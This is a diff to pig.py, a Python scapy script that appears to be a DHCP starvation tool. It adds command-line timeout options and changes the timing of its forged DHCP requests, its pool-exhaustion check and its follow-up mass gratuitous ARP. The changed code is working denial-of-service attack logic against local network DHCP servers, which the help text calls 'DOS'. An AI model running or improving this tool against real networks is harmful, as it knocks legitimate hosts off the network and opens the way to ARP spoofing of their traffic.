@@ -7,11 +7,15 @@ Usage:
     pig.py [-d -h -a -i -o] <interface>
   
 Options:
-    -d, --debug        ... enable scapy verbose output
-    -h, --help         <- you are here :)
-    -a, --show-arp     ... detect/print arp who_has
-    -i, --show-icmp    ... detect/print icmps requests
-    -o, --show-options ... print lease infos
+    -d, --debug            ... enable scapy verbose output
+    -h, --help             <- you are here :)
+    -a, --show-arp         ... detect/print arp who_has
+    -i, --show-icmp        ... detect/print icmps requests
+    -o, --show-options     ... print lease infos
+    
+    -x, --timeout-threads  ... thread spawn timer (0.4)
+    -y, --timeout-dos      ... DOS timeout (8) (wait time to mass grat.arp)
+    -z, --timeout-dhcpequest.. dhcp request timeout (2)
 """
 from scapy.all import *
 import string,binascii,signal,sys,threading,socket,struct,getopt
@@ -25,10 +29,14 @@ conf.verb = False
 show_arp = False
 show_icmp = False
 show_options = False
+timeout={}
+timeout['dos']=8        #todo(tintinweb): add these values to getopt
+timeout['dhcpip']=2
+timeout['timer']=0.4
 
 def checkArgs():
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "hdaio")
+        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:")
     except getopt.GetoptError, err:
         # print help information and exit:
         print str(err) # will print something like "option -a not recognized"
@@ -46,6 +54,12 @@ def checkArgs():
             show_icmp = True
         elif o in ("-o", "--show-options"):
             show_options=True
+        elif o in ("-x", "--timeout-threads"):
+            timeout['timer']=float(a)
+        elif o in ("-y", "--timeout-dos"):
+            timeout['dos']=float(a)
+        elif o in ("-z", "--timeout-dhcpequest"):
+            timeout['dhcpip']=float(a)
         else:
             assert False, "unhandled option"
     if len(args)==1:
@@ -193,12 +207,12 @@ class sniff_dhcp(threading.Thread):
         global dhcpdos
         while not self.kill_received and not dhcpdos:
             sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=3)
-            print "[ !! ] timeout waiting on dhcp packet count %d"%self.dhcpcount
+            if self.dhcpcount>0 : print "[ !! ] timeout waiting on dhcp packet count %d"%self.dhcpcount
             self.dhcpcount+=1
-            if self.dhcpcount==5: dhcpdos=True
+            if self.dhcpcount==2: dhcpdos=True
           
     def detect_dhcp(self,pkt):
-        global dhcpsmac,dhcpsip,subnet
+        global dhcpsmac,dhcpsip,subnet,show_arp,show_options,show_icmp
         if DHCP in pkt:
             if pkt[DHCP] and pkt[DHCP].options[0][1] == 2:
                 self.dhcpcount=0
@@ -233,18 +247,18 @@ class sniff_dhcp(threading.Thread):
                             print "\t\t* ",o[0],o[1:]    
                 
                 dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
-                sendp(dhcp_req)
                 print "[--->] DHCP_Request "+myip
+                sendp(dhcp_req)
             elif ICMP in pkt:
                 if pkt[ICMP].type==8:
                     myip=pkt[IP].dst
                     mydst=pkt[IP].src
                     if show_icmp: print "[ <- ] ICMP_Request "+mydst+" for "+myip 
                     icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
-                    if show_: 
+                    if conf.verb: 
                         print "%r"%icmp_req 
-                        #sendp(icmp_req)
-                        #print "ICMP response from "+myip+" to "+mydst 
+                    #sendp(icmp_req)
+                    #print "ICMP response from "+myip+" to "+mydst 
 
             elif ARP in pkt:
                 if pkt[ARP].op ==1:        #op=1 who has, 2 is at
@@ -259,16 +273,16 @@ class sniff_dhcp(threading.Thread):
 # MAIN()
 #
 def main():
+    global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
     checkArgs()
     print "[INFO] - using interface %s"%conf.iface
     signal.signal(signal.SIGINT, signal_handler)
-    global t1,t2,t3,dhcpdos,dhcpsip,dhcpmac,subnet,nodes,timer
     dhcpsip=None
     dhcpsmac=None
     subnet=None
     nodes={}
     dhcpdos=False 
-    timer=1
+    timer=timeout['timer']
     
     t1=sniff_dhcp()
     t1.start()
@@ -277,19 +291,19 @@ def main():
     t2.start()
     
     while dhcpsip==None:
-        time.sleep(1)
+        time.sleep(timeout['dhcpip'])
         print "[  ? ] \t\twaiting for first DHCP Server response"
     
     neighbors()
     release()
     
     while not dhcpdos:
-        time.sleep(5)
+        time.sleep(timeout['dos'])
         print "[  ? ] \t\twaiting for DHCP pool exhaustion..."
         
     print "[DONE] DHCP pool exhausted!"
-    print "[INFO] waiting 10s to mass grat.arp!"
-    time.sleep(10)
+    print "[INFO] waiting %s to mass grat.arp!"%timeout['dos']
+    time.sleep(timeout['dos'])
     garp()
     print "[DONE] DHCP pool exhausted!"
   
